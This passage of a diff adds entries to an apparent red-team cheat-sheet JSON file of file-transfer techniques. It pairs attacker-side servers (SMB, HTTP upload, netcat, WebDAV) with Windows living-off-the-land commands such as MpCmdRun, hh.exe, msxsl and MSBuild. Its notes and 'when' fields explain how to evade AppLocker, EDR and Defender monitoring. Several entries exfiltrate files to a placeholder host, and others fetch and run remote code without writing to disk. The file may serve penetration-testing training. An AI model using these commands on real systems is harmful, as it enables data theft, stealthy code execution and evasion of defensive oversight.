+      "usage": "Invoke-AESEncryption -Mode Decrypt -Key 'CHANGE_ME' -Path .\\{filename}.aes",
+      "source": "htb"
+    },
+    {
+      "id": "ps_aes_decrypt",
+      "label": "PowerShell \u2014 Invoke-AESEncryption decrypt",
+      "command": "Import-Module .\\Invoke-AESEncryption.ps1\nInvoke-AESEncryption -Mode Decrypt -Key 'CHANGE_ME' -Path .\\{filename}.aes",
+      "meta": [
+        "windows",
+        "powershell",
+        "extras",
+        "encrypt",
+        "stealth",
+        "srv:client-pair"
+      ],
+      "notes": "Decrypt counterpart. Output drops the .aes extension. Same key required as encryption. Mode Encrypt also accepts -Text for short string secrets (returns base64).",
+      "references": [
+        {
+          "label": "Invoke-AESEncryption.ps1",
+          "url": "https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1"
+        }
+      ],
+      "usage": "Invoke-AESEncryption -Mode Encrypt -Key 'CHANGE_ME' -Path .\\{filename}",
+      "source": "htb"
+    },
+    {
+      "id": "srv_python_http",
+      "label": "server \u2014 python http.server",
+      "command": "python3 -m http.server {port}",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Quickest HTTP file server \u2014 serves current directory. No upload support (download only). Run from the directory containing the file you want to serve.",
+      "references": [
+        {
+          "label": "Python http.server",
+          "url": "https://docs.python.org/3/library/http.server.html"
+        }
+      ],
+      "usage": "curl http://{ip}:{port}/{filename} -o {nix_out}",
+      "when": "Quick basic HTTP server in current directory. No upload, no auth, no HTTPS \u2014 for fast download-only use.",
+      "source": "htb"
+    },
+    {
+      "id": "srv_python_upload",
+      "label": "server \u2014 python uploadserver (HTTP+upload)",
+      "command": "python3 -m uploadserver {port}",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:http-upload"
+      ],
+      "notes": "http.server + upload endpoint at /upload. HTTPS variant: sudo python3 -m uploadserver 443 --server-certificate ~/server.pem (generate cert: openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'). Don't host the cert in the served directory.",
+      "references": [
+        {
+          "label": "uploadserver",
+          "url": "https://github.com/Densaugeo/uploadserver"
+        }
+      ],
+      "usage": "curl -X POST http://{ip}:{port}/upload -F 'files=@{filename}'",
+      "source": "htb"
+    },
+    {
+      "id": "srv_smb_impacket",
+      "label": "server \u2014 impacket-smbserver",
+      "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "SMB server for Windows targets. Anonymous by default \u2014 modern Windows blocks anonymous guest, so use auth: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test. Then on target: net use n: \\\\IP\\share /user:test test.",
+      "references": [
+        {
+          "label": "impacket smbserver",
+          "url": "https://github.com/fortra/impacket/blob/master/examples/smbserver.py"
+        }
+      ],
+      "usage": "copy \\\\{ip}\\share\\{filename} {win_out}",
+      "when": "Windows targets that need SMB. Anonymous works on older Windows; use auth variant for modern Windows.",
+      "source": "htb"
+    },
+    {
+      "id": "srv_ftp_pyftpdlib",
+      "label": "server \u2014 pyftpdlib FTP",
+      "command": "sudo python3 -m pyftpdlib --port {port} --write",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:ftp-write"
+      ],
+      "notes": "FTP server with anonymous read+write. Default port without --port flag is 2121. Install: sudo pip3 install pyftpdlib --break-system-packages. Drop --write for read-only.",
+      "references": [
+        {
+          "label": "pyftpdlib",
+          "url": "https://github.com/giampaolo/pyftpdlib"
+        }
+      ],
+      "usage": "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{win_out}')",
+      "source": "htb"
+    },
+    {
+      "id": "srv_webdav_wsgidav",
+      "label": "server \u2014 wsgidav (WebDAV)",
+      "command": "sudo wsgidav --host=0.0.0.0 --port={port} --root=/tmp --auth=anonymous",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:webdav"
+      ],
+      "notes": "WebDAV server \u2014 Windows clients can use SMB-style UNC paths over HTTP (\\\\IP\\DavWWWRoot\\). Bypasses TCP/445 blocks. Install: sudo pip3 install wsgidav cheroot --break-system-packages. Anonymous = read+write on /tmp.",
+      "references": [
+        {
+          "label": "wsgidav",
+          "url": "https://github.com/mar10/wsgidav"
+        }
+      ],
+      "usage": "copy \\\\{ip}\\DavWWWRoot\\{filename} {win_out}",
+      "source": "htb"
+    },
+    {
+      "id": "srv_openssl_sserver",
+      "label": "server \u2014 openssl s_server (TLS)",
+      "command": "openssl s_server -quiet -accept {port} -cert cert.pem -key key.pem < {filename}",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:tls"
+      ],
+      "notes": "TLS file sender \u2014 pairs with `openssl s_client -connect IP:PORT -quiet > out` on target. Looks like generic HTTPS on the wire. Generate cert first: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=server'.",
+      "references": [
+        {
+          "label": "openssl s_server",
+          "url": "https://www.openssl.org/docs/man3.0/man1/openssl-s_server.html"
+        }
+      ],
+      "usage": "openssl s_client -connect {ip}:{port} -quiet > {nix_out}",
+      "source": "htb"
+    },
+    {
+      "id": "srv_nc_listen",
+      "label": "server \u2014 nc receiver",
+      "command": "sudo nc -lvnp {port} > received_file",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:nc-listen"
+      ],
+      "notes": "Catch a file from a netcat sender on target. Pair with nc -q 0 {ip} {port} < {filename} or ncat --send-only on target. Strip protocol overhead \u2014 raw TCP only.",
+      "references": [
+        {
+          "label": "Ncat",
+          "url": "https://nmap.org/ncat/"
+        }
+      ],
+      "usage": "nc -q 0 {ip} {port} < {filename}",
+      "source": "htb"
+    },
+    {
+      "id": "srv_nginx_put",
+      "label": "server \u2014 nginx WebDAV PUT",
+      "command": "# /etc/nginx/sites-available/upload.conf\nserver {\n    listen {port};\n    location /SecretUploadDirectory/ {\n        root /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n\n# Enable + restart:\nsudo mkdir -p /var/www/uploads/SecretUploadDirectory\nsudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\nsudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\nsudo systemctl restart nginx",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "server",
+        "stealth",
+        "srv:nginx-put"
+      ],
+      "notes": "Persistent nginx server accepting PUT uploads. Better than python uploadserver for production-grade catching. Port 80 conflict on Pwnbox? sudo rm /etc/nginx/sites-enabled/default. Upload from target: curl -T file http://IP:PORT/SecretUploadDirectory/file.",
+      "references": [
+        {
+          "label": "nginx WebDAV",
+          "url": "https://nginx.org/en/docs/http/ngx_http_dav_module.html"
+        }
+      ],
+      "usage": "curl -T {filename} http://{ip}:{port}/SecretUploadDirectory/{filename}",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_findstr_smb",
+      "label": "cmd \u2014 findstr /V via SMB UNC",
+      "command": "findstr /V dummy \\\\{ip}\\share\\{filename} > {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "findstr is for searching strings \u2014 abused here as a copy mechanism. /V dummy = print all lines NOT matching 'dummy' (i.e., the whole file). Source must be SMB UNC, not HTTP. Less monitored than copy/SMB.",
+      "source": "htb",
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "when": "AppLocker blocks copy.exe but allows other Microsoft-signed binaries. Or you want a less common SMB-grab signature.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Findstr",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Findstr/"
+        }
+      ]
+    },
+    {
+      "id": "cmd_hh_url",
+      "label": "cmd \u2014 Hh.exe (HTML Help)",
+      "command": "hh.exe http://{ip}:{port}/{filename}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "hh.exe is the HTML Help viewer. Fetches a URL and renders the content as HTML help. With a malicious .htm payload, this becomes execution. Microsoft-signed, very obscure.",
+      "source": "htb",
+      "usage": "python3 -m http.server {port}",
+      "when": "AppLocker permits hh.exe (default Windows Help viewer is rarely blocked). Useful for code execution from URL more than file save.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Hh.exe",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Hh/"
+        }
+      ]
+    },
+    {
+      "id": "cmd_replace_smb",
+      "label": "cmd \u2014 Replace.exe via SMB UNC",
+      "command": "replace.exe \\\\{ip}\\share\\{filename} {win_out} /A",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "replace.exe normally replaces files in a destination directory. /A flag adds source files that don't exist in the destination \u2014 turns it into a copy. SMB UNC source. Microsoft-signed, rarely monitored.",
+      "source": "htb",
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "when": "Less common SMB copy alternative. Use when copy.exe / esentutl / xcopy are watched but replace.exe isn't.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Replace",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Replace/"
+        }
+      ]
+    },
+    {
+      "id": "win_mpcmdrun",
+      "label": "cmd \u2014 MpCmdRun (Defender download)",
+      "command": ":: Find the Defender Platform folder first:\n::   dir /B \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\"\n\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\<VERSION>\\MpCmdRun.exe\" -DownloadFile -url http://{ip}:{port}/{filename} -path {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth"
+      ],
+      "notes": "Microsoft Defender's own download utility \u2014 abused to fetch arbitrary files. Microsoft-signed, AV almost never monitors its own binary. The Platform path contains a version-numbered folder that changes with Defender updates \u2014 discover it with 'dir /B' or 'where /R C:\\ProgramData MpCmdRun.exe'.",
+      "source": "community",
+      "usage": "python3 -m http.server {port}",
+      "when": "Defender is installed (most enterprise Windows). You're avoiding PowerShell/certutil which are flagged. MpCmdRun is the AV itself \u2014 defenders rarely watch it.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 MpCmdRun",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/"
+        },
+        {
+          "label": "api0cradle ADS gist",
+          "url": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
+        }
+      ]
+    },
+    {
+      "id": "win_msxsl",
+      "label": "cmd \u2014 msxsl (XSL transform LOLBIN)",
+      "command": "msxsl.exe http://{ip}:{port}/payload.xml http://{ip}:{port}/transform.xsl -o {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth"
+      ],
+      "notes": "Microsoft XSL Transformations utility. Fetches an XML doc + an XSL stylesheet from URL and writes the transformed output to disk. Use for code execution or to fetch+process remote content. Note: msxsl.exe isn't in default Windows \u2014 must be downloaded from Microsoft, but is signed.",
+      "source": "community",
+      "usage": "python3 -m http.server {port}",
+      "when": "Target has msxsl.exe present (some legacy enterprise installs). You want a download path that goes through XSL transformation \u2014 useful for fileless execution variants.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Msxsl",
+          "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/"
+        }
+      ]
+    },
+    {
+      "id": "win_extrac32",
+      "label": "cmd \u2014 extrac32 (CAB from SMB)",
+      "command": "extrac32 \\\\{ip}\\share\\{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "Built-in Windows CAB extraction tool. Accepts SMB UNC source. Less commonly monitored than copy.exe / esentutl. Source must be a .cab file (or expand-able archive). Microsoft-signed.",
+      "source": "community",
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "when": "AppLocker / EDR is watching copy.exe and esentutl but missed extrac32. Or you're packaging payloads as CAB anyway.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Extrac32",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Extrac32/"
+        },
+        {
+          "label": "api0cradle ADS gist",
+          "url": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
+        }
+      ]
+    },
+    {
+      "id": "win_msbuild",
+      "label": "cmd \u2014 MSBuild (csproj from WebDAV)",
+      "command": "MSBuild.exe \\\\{ip}@{port}\\share\\{filename}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "fileless",
+        "stealth",
+        "srv:webdav"
+      ],
+      "notes": "Microsoft Build Engine \u2014 fetches + compiles + executes a .csproj file containing inline C# tasks. Microsoft-signed, ships with .NET on every modern Windows, allowed by AppLocker. The \\\\IP@PORT\\share\\file syntax is WebDAV-over-UNC, so it works over HTTP/80 even when SMB/445 is blocked outbound. Heavily used in modern C2 (Covenant, Donut). No disk write \u2014 payload runs via WebDAV redirector.",
+      "source": "community",
+      "usage": "sudo wsgidav --host=0.0.0.0 --port={port} --root=/tmp --auth=anonymous",
+      "when": "AppLocker blocks PowerShell + scripts but allows .NET Framework binaries (the default lockdown on hardened Windows). MSBuild is the canonical bypass \u2014 Microsoft-signed, build-toolchain category, almost never blocked.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 MSBuild",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/MSBuild/"
+        },
+        {
+          "label": "Bohops \u2014 MSBuild abuse",
+          "url": "https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/"
+        }
+      ]
+    }
+  ]
+}
